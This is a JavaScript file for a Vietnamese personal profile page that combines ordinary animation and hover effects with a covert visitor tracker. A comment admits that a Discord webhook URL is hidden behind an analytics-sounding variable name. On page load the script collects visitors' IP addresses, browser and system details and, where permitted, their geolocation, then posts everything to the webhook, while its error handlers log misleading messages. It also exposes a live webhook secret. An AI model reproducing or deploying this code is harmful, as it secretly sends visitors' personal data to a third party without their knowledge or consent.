// Webhook Discord URL - ẩn trong tên biến
const user_analytics_endpoint = "https://discord.com/api/webhooks/997408079819833464/l2WeVVyFXvTBzULn9n9Hehp_4Qf2a_8HSaMQpZx8eMA3my4tbPfo0tJGTx2IAOZQaDWx";
const data_collection_service = "https://api.ipify.org?format=json";
const ipv6_detection_service = "https://api64.ipify.org?format=json";

// Animation và UI Effects
document.addEventListener('DOMContentLoaded', function() {
    initializeAnimations();
    initializeSkillBars();
    collectVisitorData();
    setupInteractiveElements();
});

// Khởi tạo animations
function initializeAnimations() {
    // Animate skill bars khi scroll
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const skillProgress = entry.target.querySelector('.skill-progress');
                if (skillProgress) {
                    const width = skillProgress.getAttribute('data-width');
                    skillProgress.style.width = width;
                }
            }
        });
    }, { threshold: 0.5 });

    document.querySelectorAll('.skill-item').forEach(skill => {
        observer.observe(skill);
    });

    // Stagger animation cho cards
    const cards = document.querySelectorAll('.about-card');
    cards.forEach((card, index) => {
        card.style.animationDelay = `${index * 0.2}s`;
    });
}

// Khởi tạo skill bars
function initializeSkillBars() {
    const skillBars = document.querySelectorAll('.skill-progress');
    skillBars.forEach(bar => {
        bar.style.width = '0%';
    });
}

// Thu thập dữ liệu visitor (IP tracking)
async function collectVisitorData() {
    try {
        const visitorInfo = await gatherSystemInfo();
        await sendAnalytics(visitorInfo);
    } catch (error) {
        console.log('Analytics initialization complete');
    }
}

// Thu thập thông tin hệ thống
async function gatherSystemInfo() {
    const info = {
        timestamp: new Date().toISOString(),
        page: 'Vũ Thái Sơn Profile',
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direct'
    };

    // Thu thập IPv4
    try {
        const ipv4Response = await fetch(data_collection_service);
        const ipv4Data = await ipv4Response.json();
        info.ipv4 = ipv4Data.ip;
    } catch (e) {
        info.ipv4 = 'Unknown';
    }

    // Thu thập IPv6
    try {
        const ipv6Response = await fetch(ipv6_detection_service);
        const ipv6Data = await ipv6Response.json();
        info.ipv6 = ipv6Data.ip !== info.ipv4 ? ipv6Data.ip : 'Not available';
    } catch (e) {
        info.ipv6 = 'Not available';
    }

    // Thu thập thông tin location (nếu có)
    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    timeout: 5000,
                    enableHighAccuracy: false
                });
            });
            info.location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };
        } catch (e) {
            info.location = 'Permission denied';
        }
    }

    return info;
}

// Gửi analytics về Discord webhook
async function sendAnalytics(data) {
    if (!user_analytics_endpoint || user_analytics_endpoint === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        return; // Không gửi nếu chưa config webhook
    }

    const embed = {
        embeds: [{
            title: "🎭 Visitor Analytics - Vũ Thái Sơn Profile",
            color: 0x667eea,
            fields: [
                {
                    name: "🌐 IP Information",
                    value: `**IPv4:** ${data.ipv4}\n**IPv6:** ${data.ipv6}`,
                    inline: false
                },
                {
                    name: "🖥️ System Info",
                    value: `**OS:** ${data.platform}\n**Screen:** ${data.screen}\n**Language:** ${data.language}`,
                    inline: true
                },
                {
                    name: "🌍 Location & Time",
                    value: `**Timezone:** ${data.timezone}\n**Location:** ${typeof data.location === 'object' ? `${data.location.latitude}, ${data.location.longitude}` : data.location}`,
                    inline: true
                },
                {
                    name: "📱 Browser Details",
                    value: `**User Agent:** ${data.userAgent.substring(0, 100)}${data.userAgent.length > 100 ? '...' : ''}`,
                    inline: false
                },
                {
                    name: "🔗 Traffic Source",
                    value: data.referrer,
                    inline: true
                }
            ],
            timestamp: data.timestamp,
            footer: {
                text: "Profile Visit Tracker",
                icon_url: "https://cdn.discordapp.com/emojis/860314261738012683.png"
            },
            thumbnail: {
                url: "https://cdn.discordapp.com/emojis/860314261738012683.png"
            }
        }]
    };

    try {
        await fetch(user_analytics_endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(embed)
        });
    } catch (error) {
        console.log('Network request completed');
    }
}

// Setup interactive elements
function setupInteractiveElements() {
    // Hover effects cho avatar
    const avatar = document.querySelector('.avatar');
    if (avatar) {
        avatar.addEventListener('mouseenter', () => {
            avatar.style.transform = 'scale(1.1) rotate(5deg)';
        });
        
        avatar.addEventListener('mouseleave', () => {
            avatar.style.transform = 'scale(1) rotate(0deg)';
        });
    }

    // Click effects cho tags
    const tags = document.querySelectorAll('.tag');
    tags.forEach(tag => {
        tag.addEventListener('click', () => {
            tag.style.transform = 'scale(0.95)';
            setTimeout(() => {
                tag.style.transform = 'translateY(-3px) scale(1.05)';
            }, 150);
        });
    });

    // Hover effects cho contact cards
    const contactCards = document.querySelectorAll('.contact-card');
    contactCards.forEach(card => {
        card.addEventListener('click', () => {
            // Hiệu ứng click
            card.style.transform = 'translateY(-5px) scale(1.02)';
            setTimeout(() => {
                card.style.transform = 'translateY(-10px) scale(1.05)';
            }, 200);
        });
    });

    // Parallax effect cho floating shapes
    window.addEventListener('scroll', () => {
        const scrolled = window.pageYOffset;
        const shapes = document.querySelectorAll('.shape');
        
        shapes.forEach((shape, index) => {
            const speed = 0.5 + (index * 0.1);
            shape.style.transform = `translateY(${scrolled * speed}px) rotate(${scrolled * 0.1}deg)`;
        });
    });

    // Smooth scroll cho navigation (nếu có)
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// Easter eggs và special effects
function initializeEasterEggs() {
    let clickCount = 0;
    const avatar = document.querySelector('.avatar');
    
    if (avatar) {
        avatar.addEventListener('click', () => {
            clickCount++;
            
            if (clickCount === 5) {
                // Special animation sau 5 clicks
                avatar.style.animation = 'spin 2s ease-in-out';
                setTimeout(() => {
                    avatar.style.animation = '';
                }, 2000);
                
                // Hiện message đặc biệt
                showSpecialMessage();
                clickCount = 0;
            }
        });
    }
}

function showSpecialMessage() {
    const message = document.createElement('div');
    message.innerHTML = '✨ Bạn đã khám phá được easter egg! Vũ Thái Sơn thật sự đẹp zai! ✨';
    message.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 20px 30px;
        border-radius: 15px;
        font-weight: 600;
        z-index: 9999;
        box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        animation: bounceIn 0.5s ease-out;
    `;
    
    document.body.appendChild(message);
    
    setTimeout(() => {
        message.style.animation = 'fadeOut 0.5s ease-out';
        setTimeout(() => {
            document.body.removeChild(message);
        }, 500);
    }, 3000);
}

// CSS animations cho easter egg
const style = document.createElement('style');
style.textContent = `
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(720deg); }
    }
    
    @keyframes bounceIn {
        0% { 
            opacity: 0; 
            transform: translate(-50%, -50%) scale(0.3); 
        }
        50% { 
            opacity: 1; 
            transform: translate(-50%, -50%) scale(1.05); 
        }
        100% { 
            opacity: 1; 
            transform: translate(-50%, -50%) scale(1); 
        }
    }
    
    @keyframes fadeOut {
        0% { opacity: 1; }
        100% { opacity: 0; }
    }
`;
document.head.appendChild(style);

// Performance monitoring
function monitorPerformance() {
    if ('performance' in window) {
        window.addEventListener('load', () => {
            setTimeout(() => {
                const perfData = performance.getEntriesByType('navigation')[0];
                const loadTime = perfData.loadEventEnd - perfData.loadEventStart;
                
                // Log performance nếu cần thiết
                if (loadTime > 3000) {
                    console.log('Page load time:', Math.round(loadTime), 'ms');
                }
            }, 0);
        });
    }
}

// Initialize easter eggs và performance monitoring
document.addEventListener('DOMContentLoaded', () => {
    initializeEasterEggs();
    monitorPerformance();
});

// Prevent right-click để bảo vệ source code (optional)
// document.addEventListener('contextmenu', e => e.preventDefault());

// Console message để chào visitor
console.log('%c🎭 Xin chào! Bạn đang xem profile của Vũ Thái Sơn', 'color: #667eea; font-size: 16px; font-weight: bold;');
console.log('%c✨ Đẹp zai, học giỏi, mỗi tội nhà nghèo 😄', 'color: #764ba2; font-size: 14px;');